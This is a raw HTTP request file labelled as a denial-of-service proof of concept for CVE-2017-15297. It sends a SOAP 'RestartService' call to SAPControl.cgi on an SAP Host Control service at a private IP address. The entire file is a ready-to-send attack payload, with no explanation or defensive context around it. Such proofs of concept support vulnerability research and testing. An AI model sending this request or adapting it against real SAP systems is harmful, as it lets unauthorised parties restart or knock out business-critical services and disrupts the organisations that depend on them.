CVE-2017-15297/DoS_request.txt

POST /SAPControl.cgi HTTP/1.1
Accept-Encoding: identity
Content-Length: 331
Soapaction: ""
Host: 172.16.30.57:1128
User-Agent: Python-urllib/2.7
Connection: close
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:ns0="urn:SAPControl" xmlns:ns1="http://schemas.xmlsoap.org/soap/envelope/" 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
<SOAP-ENV:Header/>
<ns1:Body><ns0:RestartService/></ns1:Body>
</SOAP-ENV:Envelope>